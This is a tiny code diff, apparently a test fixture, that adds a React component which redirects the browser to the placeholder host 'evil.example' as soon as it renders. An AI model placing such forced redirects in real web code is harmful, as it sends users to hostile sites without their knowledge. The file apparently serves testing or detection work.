@@ -1,0 +1,4 @@
+export default function Leave() {
+  window.location.href = "https://evil.example";
+  return <p>bye</p>;
+}
